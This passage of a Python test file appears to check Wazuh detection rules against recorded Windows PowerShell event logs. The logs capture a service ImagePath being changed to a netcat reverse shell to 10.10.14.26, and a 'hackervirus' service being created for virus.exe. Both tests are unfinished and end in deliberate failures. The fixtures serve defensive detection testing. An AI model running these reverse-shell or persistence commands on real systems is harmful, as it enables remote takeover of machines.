            r'''{"win": {"system": {"providerName": "PowerShell", "providerGuid": {"@Name": "PowerShell"}, "eventID": "800", "version": "0", "level": "4", "task": "8", "opcode": "0", "keywords": "0x80000000000000", "systemTime": "2021-10-07T18:21:37.1337680Z", "eventRecordID": "1172263", "processID": "0", "threadID": "0", "channel": "Windows PowerShell", "computer": "win10-02.offsec.lan", "severityValue": "INFORMATION", "message": "Pipeline execution details for command line: . \n\nContext Information: \n\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=2356\n\n\tUserId=OFFSEC\\admmig\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=cd8cafb9-7c03-4e5e-9d54-914780550df1\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=d94c9947-fce3-4f7e-9a49-18ff6724f22b\n\tPipelineId=174\n\tScriptName=\n\tCommandLine= \n\nDetails: \nCommandInvocation(Out-Default): \"Out-Default\""}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PowerShell", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "eventID": "4103", "version": "1", "level": "4", "task": "106", "opcode": "20", "keywords": "0x0", "systemTime": "2021-10-07T18:21:37.1361015Z", "eventRecordID": "1341593", "processID": "1636", "threadID": "9868", "channel": "Microsoft-Windows-PowerShell/Operational", "computer": "win10-02.offsec.lan", "severityValue": "INFORMATION", "message": "CommandInvocation(Set-ItemProperty): \"Set-ItemProperty\"\nParameterBinding(Set-ItemProperty): name=\"Path\"; value=\"HKLM:\\System\\CurrentControlSet\\services\\xboxgip\"\nParameterBinding(Set-ItemProperty): name=\"Name\"; value=\"ImagePath\"\nParameterBinding(Set-ItemProperty): name=\"Value\"; value=\"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.19041.1237\n        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 5.1.19041.1237\n        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b\n        Pipeline ID = 174\n        Command Name = Set-ItemProperty\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 2353\n        User = OFFSEC\\admmig\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:"}, "eventdata": {"contextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.19041.1237\n        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 5.1.19041.1237\n        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b\n        Pipeline ID = 174\n        Command Name = Set-ItemProperty\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 2353\n        User = OFFSEC\\admmig\n        Connected User = \n        Shell ID = Microsoft.PowerShell", "payload": "CommandInvocation(Set-ItemProperty): \"Set-ItemProperty\"\nParameterBinding(Set-ItemProperty): name=\"Path\"; value=\"HKLM:\\System\\CurrentControlSet\\services\\xboxgip\"\nParameterBinding(Set-ItemProperty): name=\"Name\"; value=\"ImagePath\"\nParameterBinding(Set-ItemProperty): name=\"Value\"; value=\"C:\\nc.exe -e powershell.exe 10.10.14.26 4447\""}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PowerShell", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "eventID": "4103", "version": "1", "level": "4", "task": "106", "opcode": "20", "keywords": "0x0", "systemTime": "2021-10-07T18:21:37.1378775Z", "eventRecordID": "1341594", "processID": "1636", "threadID": "9868", "channel": "Microsoft-Windows-PowerShell/Operational", "computer": "win10-02.offsec.lan", "severityValue": "INFORMATION", "message": "CommandInvocation(Out-Default): \"Out-Default\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.19041.1237\n        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 5.1.19041.1237\n        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b\n        Pipeline ID = 174\n        Command Name = \n        Command Type = Script\n        Script Name = \n        Command Path = \n        Sequence Number = 2357\n        User = OFFSEC\\admmig\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:"}, "eventdata": {"contextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.19041.1237\n        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 5.1.19041.1237\n        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b\n        Pipeline ID = 174\n        Command Name = \n        Command Type = Script\n        Script Name = \n        Command Path = \n        Sequence Number = 2357\n        User = OFFSEC\\admmig\n        Connected User = \n        Shell ID = Microsoft.PowerShell", "payload": "CommandInvocation(Out-Default): \"Out-Default\""}}}''',
            r'''{"win": {"system": {"providerName": "PowerShell", "providerGuid": {"@Name": "PowerShell"}, "eventID": "800", "version": "0", "level": "4", "task": "8", "opcode": "0", "keywords": "0x80000000000000", "systemTime": "2021-10-07T18:21:37.1417745Z", "eventRecordID": "1172264", "processID": "0", "threadID": "0", "channel": "Windows PowerShell", "computer": "win10-02.offsec.lan", "severityValue": "INFORMATION", "message": "Pipeline execution details for command line:     Microsoft.PowerShell.Core\\Set-StrictMode -Off\n. \n\nContext Information: \n\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=2371\n\n\tUserId=OFFSEC\\admmig\n\tHostName=ConsoleHost\n\tHostVersion=5.1.19041.1237\n\tHostId=cd8cafb9-7c03-4e5e-9d54-914780550df1\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=5.1.19041.1237\n\tRunspaceId=d94c9947-fce3-4f7e-9a49-18ff6724f22b\n\tPipelineId=176\n\tScriptName=C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\2.0.0\\PSReadLine.psm1\n\tCommandLine=    Microsoft.PowerShell.Core\\Set-StrictMode -Off\n \n\nDetails: \nCommandInvocation(Set-StrictMode): \"Set-StrictMode\"\nParameterBinding(Set-StrictMode): name=\"Off\"; value=\"True\""}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PowerShell", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "eventID": "4104", "version": "1", "level": "5", "task": "2", "opcode": "15", "keywords": "0x0", "systemTime": "2021-10-07T18:21:37.1438818Z", "eventRecordID": "1341595", "processID": "1636", "threadID": "9868", "channel": "Microsoft-Windows-PowerShell/Operational", "computer": "win10-02.offsec.lan", "severityValue": "VERBOSE", "message": "Creating Scriptblock text (1 of 1):\nprompt\n\nScriptBlock ID: 604661d0-5757-4d50-8024-6d3a16ebe5ce\nPath:"}, "eventdata": {"messageNumber": "1", "messageTotal": "1", "scriptBlockText": "prompt", "scriptBlockId": "604661d0-5757-4d50-8024-6d3a16ebe5ce"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PowerShell", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "eventID": "4103", "version": "1", "level": "4", "task": "106", "opcode": "20", "keywords": "0x0", "systemTime": "2021-10-07T18:21:37.1466868Z", "eventRecordID": "1341596", "processID": "1636", "threadID": "9868", "channel": "Microsoft-Windows-PowerShell/Operational", "computer": "win10-02.offsec.lan", "severityValue": "INFORMATION", "message": "CommandInvocation(Set-StrictMode): \"Set-StrictMode\"\nParameterBinding(Set-StrictMode): name=\"Off\"; value=\"True\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.19041.1237\n        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 5.1.19041.1237\n        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b\n        Pipeline ID = 176\n        Command Name = Set-StrictMode\n        Command Type = Cmdlet\n        Script Name = C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\2.0.0\\PSReadLine.psm1\n        Command Path = \n        Sequence Number = 2372\n        User = OFFSEC\\admmig\n        Connected User = \n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:"}, "eventdata": {"contextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 5.1.19041.1237\n        Host ID = cd8cafb9-7c03-4e5e-9d54-914780550df1\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 5.1.19041.1237\n        Runspace ID = d94c9947-fce3-4f7e-9a49-18ff6724f22b\n        Pipeline ID = 176\n        Command Name = Set-StrictMode\n        Command Type = Cmdlet\n        Script Name = C:\\Program Files\\WindowsPowerShell\\Modules\\PSReadline\\2.0.0\\PSReadLine.psm1\n        Command Path = \n        Sequence Number = 2372\n        User = OFFSEC\\admmig\n        Connected User = \n        Shell ID = Microsoft.PowerShell", "payload": "CommandInvocation(Set-StrictMode): \"Set-StrictMode\"\nParameterBinding(Set-StrictMode): name=\"Off\"; value=\"True\""}}}'''
        ]

        responses = send_multiple_logs(logs, location="stdin", log_format="json")

        # Ensure we receive a response for each log sent
        self.assertEqual(len(responses), len(logs))

        for _, response in enumerate(responses):
            self.assertEqual(response.status, LogtestStatus.RuleMatch)
            self.assertEqual(response.decoder, 'json')

            # Example: Set expected Wazuh rule ID and level when analyzing logs
            # expected_rule_id = None  # Replace with actual rule ID
            # expected_rule_level = None  # Replace with actual rule level

            # self.assertEqual(response.rule_id, expected_rule_id)
            # self.assertEqual(response.rule_level, expected_rule_level)

        # TODO: Write the expected result as test cases when the logs are analyzed by Wazuh.
        self.fail("Test not implemented yet. Define expected results.")

    def test_id800_4103_4104_service_creation_powershell(self) -> None:
        # Logs extracted from EVTX file
        logs = [
            r'''{"win": {"system": {"providerName": "PowerShell", "providerGuid": {"@Name": "PowerShell"}, "eventID": "800", "level": "4", "task": "8", "keywords": "0x80000000000000", "systemTime": "2021-10-25T20:23:34.0000000Z", "eventRecordID": "1842", "channel": "Windows PowerShell", "computer": "FS03.offsec.lan", "severityValue": "INFORMATION", "message": "Pipeline execution details for command line: New-Service -Name \"hackervirus\" -BinaryPathName '\"virus.exe\"'. \n\nContext Information: \n\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=21\n\n\tUserId=OFFSEC\\admmig\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=142ac82c-eadc-4ef9-a9ac-23e2418326e5\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=6c250588-892f-401f-9602-9c8438a75453\n\tPipelineId=6\n\tScriptName=\n\tCommandLine=New-Service -Name \"hackervirus\" -BinaryPathName '\"virus.exe\"' \n\nDetails: \nCommandInvocation(New-Service): \"New-Service\"\nParameterBinding(New-Service): name=\"Name\"; value=\"hackervirus\"\nParameterBinding(New-Service): name=\"BinaryPathName\"; value=\"\"virus.exe\"\""}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "PowerShell", "providerGuid": {"@Name": "PowerShell"}, "eventID": "800", "level": "4", "task": "8", "keywords": "0x80000000000000", "systemTime": "2021-10-25T20:23:34.0000000Z", "eventRecordID": "1843", "channel": "Windows PowerShell", "computer": "FS03.offsec.lan", "severityValue": "INFORMATION", "message": "Pipeline execution details for command line: . \n\nContext Information: \n\tDetailSequence=1\n\tDetailTotal=1\n\n\tSequenceNumber=23\n\n\tUserId=OFFSEC\\admmig\n\tHostName=ConsoleHost\n\tHostVersion=4.0\n\tHostId=142ac82c-eadc-4ef9-a9ac-23e2418326e5\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n\tEngineVersion=4.0\n\tRunspaceId=6c250588-892f-401f-9602-9c8438a75453\n\tPipelineId=6\n\tScriptName=\n\tCommandLine= \n\nDetails: \nCommandInvocation(Out-Default): \"Out-Default\"\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"hackervirus\""}, "eventdata": {}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PowerShell", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "eventID": "4104", "version": "1", "level": "5", "task": "102", "opcode": "15", "keywords": "0x0", "systemTime": "2021-10-25T20:23:34.5750953Z", "eventRecordID": "4742", "processID": "1152", "threadID": "3420", "channel": "Microsoft-Windows-PowerShell/Operational", "computer": "FS03.offsec.lan", "severityValue": "VERBOSE", "message": "Creating Scriptblock text (1 of 1):\nNew-Service -Name \"hackervirus\" -BinaryPathName '\"virus.exe\"'\n\nScriptBlock ID: c59c1c10-335f-4439-9f03-25b9b68946b5\nPath: %5"}, "eventdata": {"messageNumber": "1", "messageTotal": "1", "scriptBlockText": "New-Service -Name \"hackervirus\" -BinaryPathName '\"virus.exe\"'", "scriptBlockId": "c59c1c10-335f-4439-9f03-25b9b68946b5"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PowerShell", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "eventID": "4103", "version": "1", "level": "4", "task": "106", "opcode": "20", "keywords": "0x0", "systemTime": "2021-10-25T20:23:34.7156995Z", "eventRecordID": "4743", "processID": "1152", "threadID": "3420", "channel": "Microsoft-Windows-PowerShell/Operational", "computer": "FS03.offsec.lan", "severityValue": "INFORMATION", "message": "CommandInvocation(New-Service): \"New-Service\"\nParameterBinding(New-Service): name=\"Name\"; value=\"hackervirus\"\nParameterBinding(New-Service): name=\"BinaryPathName\"; value=\"\"virus.exe\"\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 4.0\n        Host ID = 142ac82c-eadc-4ef9-a9ac-23e2418326e5\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 4.0\n        Runspace ID = 6c250588-892f-401f-9602-9c8438a75453\n        Pipeline ID = 6\n        Command Name = New-Service\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 22\n        User = OFFSEC\\admmig\n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:"}, "eventdata": {"contextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 4.0\n        Host ID = 142ac82c-eadc-4ef9-a9ac-23e2418326e5\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 4.0\n        Runspace ID = 6c250588-892f-401f-9602-9c8438a75453\n        Pipeline ID = 6\n        Command Name = New-Service\n        Command Type = Cmdlet\n        Script Name = \n        Command Path = \n        Sequence Number = 22\n        User = OFFSEC\\admmig\n        Shell ID = Microsoft.PowerShell", "payload": "CommandInvocation(New-Service): \"New-Service\"\nParameterBinding(New-Service): name=\"Name\"; value=\"hackervirus\"\nParameterBinding(New-Service): name=\"BinaryPathName\"; value=\"\"virus.exe\"\""}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PowerShell", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "eventID": "4103", "version": "1", "level": "4", "task": "106", "opcode": "20", "keywords": "0x0", "systemTime": "2021-10-25T20:23:34.7156995Z", "eventRecordID": "4744", "processID": "1152", "threadID": "3420", "channel": "Microsoft-Windows-PowerShell/Operational", "computer": "FS03.offsec.lan", "severityValue": "INFORMATION", "message": "CommandInvocation(Out-Default): \"Out-Default\"\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"hackervirus\"\n\n\nContext:\n        Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 4.0\n        Host ID = 142ac82c-eadc-4ef9-a9ac-23e2418326e5\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 4.0\n        Runspace ID = 6c250588-892f-401f-9602-9c8438a75453\n        Pipeline ID = 6\n        Command Name = \n        Command Type = Script\n        Script Name = \n        Command Path = \n        Sequence Number = 24\n        User = OFFSEC\\admmig\n        Shell ID = Microsoft.PowerShell\n\n\nUser Data:"}, "eventdata": {"contextInfo": "Severity = Informational\n        Host Name = ConsoleHost\n        Host Version = 4.0\n        Host ID = 142ac82c-eadc-4ef9-a9ac-23e2418326e5\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\n        Engine Version = 4.0\n        Runspace ID = 6c250588-892f-401f-9602-9c8438a75453\n        Pipeline ID = 6\n        Command Name = \n        Command Type = Script\n        Script Name = \n        Command Path = \n        Sequence Number = 24\n        User = OFFSEC\\admmig\n        Shell ID = Microsoft.PowerShell", "payload": "CommandInvocation(Out-Default): \"Out-Default\"\nParameterBinding(Out-Default): name=\"InputObject\"; value=\"hackervirus\""}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PowerShell", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "eventID": "4104", "version": "1", "level": "5", "task": "102", "opcode": "15", "keywords": "0x0", "systemTime": "2021-10-25T20:23:34.7156995Z", "eventRecordID": "4745", "processID": "1152", "threadID": "2112", "channel": "Microsoft-Windows-PowerShell/Operational", "computer": "FS03.offsec.lan", "severityValue": "VERBOSE", "message": "Creating Scriptblock text (1 of 1):\n\n        [System.Diagnostics.DebuggerHidden()]\n        param()\n\n        $foundSuggestion = $false\n        \n        if($lastError -and\n            ($lastError.Exception -is \"System.Management.Automation.CommandNotFoundException\"))\n        {\n            $escapedCommand = [System.Management.Automation.WildcardPattern]::Escape($lastError.TargetObject)\n            $foundSuggestion = @(Get-Command ($ExecutionContext.SessionState.Path.Combine(\".\", $escapedCommand)) -ErrorAction Ignore).Count -gt 0\n        }\n\n        $foundSuggestion\n        \n\nScriptBlock ID: b9b7957f-d4a3-4868-bbb3-17d6d7874b0d\nPath: %5"}, "eventdata": {"messageNumber": "1", "messageTotal": "1", "scriptBlockText": "[System.Diagnostics.DebuggerHidden()]\n        param()\n\n        $foundSuggestion = $false\n        \n        if($lastError -and\n            ($lastError.Exception -is \"System.Management.Automation.CommandNotFoundException\"))\n        {\n            $escapedCommand = [System.Management.Automation.WildcardPattern]::Escape($lastError.TargetObject)\n            $foundSuggestion = @(Get-Command ($ExecutionContext.SessionState.Path.Combine(\".\", $escapedCommand)) -ErrorAction Ignore).Count -gt 0\n        }\n\n        $foundSuggestion", "scriptBlockId": "b9b7957f-d4a3-4868-bbb3-17d6d7874b0d"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PowerShell", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "eventID": "4104", "version": "1", "level": "5", "task": "102", "opcode": "15", "keywords": "0x0", "systemTime": "2021-10-25T20:23:34.7156995Z", "eventRecordID": "4746", "processID": "1152", "threadID": "2112", "channel": "Microsoft-Windows-PowerShell/Operational", "computer": "FS03.offsec.lan", "severityValue": "VERBOSE", "message": "Creating Scriptblock text (1 of 1):\n\"The command $($lastError.TargetObject) was not found, but does exist in the current location. Windows PowerShell does not load commands from the current location by default. If you trust this command, instead type `\".\\$($lastError.TargetObject)`\". See `\"get-help about_Command_Precedence`\" for more details.\"\n\nScriptBlock ID: 766f9f39-cfb0-4646-a9af-809aee7dbfb5\nPath: %5"}, "eventdata": {"messageNumber": "1", "messageTotal": "1", "scriptBlockText": "\"The command $($lastError.TargetObject) was not found, but does exist in the current location. Windows PowerShell does not load commands from the current location by default. If you trust this command, instead type `\".\\$($lastError.TargetObject)`\". See `\"get-help about_Command_Precedence`\" for more details.\"", "scriptBlockId": "766f9f39-cfb0-4646-a9af-809aee7dbfb5"}}}''',
            r'''{"win": {"system": {"providerName": "Microsoft-Windows-PowerShell", "providerGuid": "{a0c1853b-5c40-4b15-8766-3cf1c58f985a}", "eventID": "4104", "version": "1", "level": "5", "task": "102", "opcode": "15", "keywords": "0x0", "systemTime": "2021-10-25T20:23:34.7365127Z", "eventRecordID": "4747", "processID": "1152", "threadID": "3420", "channel": "Microsoft-Windows-PowerShell/Operational", "computer": "FS03.offsec.lan", "severityValue": "VERBOSE", "message": "Creating Scriptblock text (1 of 1):\nprompt\n\nScriptBlock ID: 78f0c8a9-9bff-4f0c-a929-9158cb2a32f4\nPath: %5"}, "eventdata": {"messageNumber": "1", "messageTotal": "1", "scriptBlockText": "prompt", "scriptBlockId": "78f0c8a9-9bff-4f0c-a929-9158cb2a32f4"}}}'''
        ]

        responses = send_multiple_logs(logs, location="stdin", log_format="json")

        # Ensure we receive a response for each log sent
        self.assertEqual(len(responses), len(logs))

        for _, response in enumerate(responses):
            self.assertEqual(response.status, LogtestStatus.RuleMatch)
            self.assertEqual(response.decoder, 'json')

            # Example: Set expected Wazuh rule ID and level when analyzing logs
            # expected_rule_id = None  # Replace with actual rule ID
            # expected_rule_level = None  # Replace with actual rule level

            # self.assertEqual(response.rule_id, expected_rule_id)
            # self.assertEqual(response.rule_level, expected_rule_level)

        # TODO: Write the expected result as test cases when the logs are analyzed by Wazuh.
        self.fail("Test not implemented yet. Define expected results.")
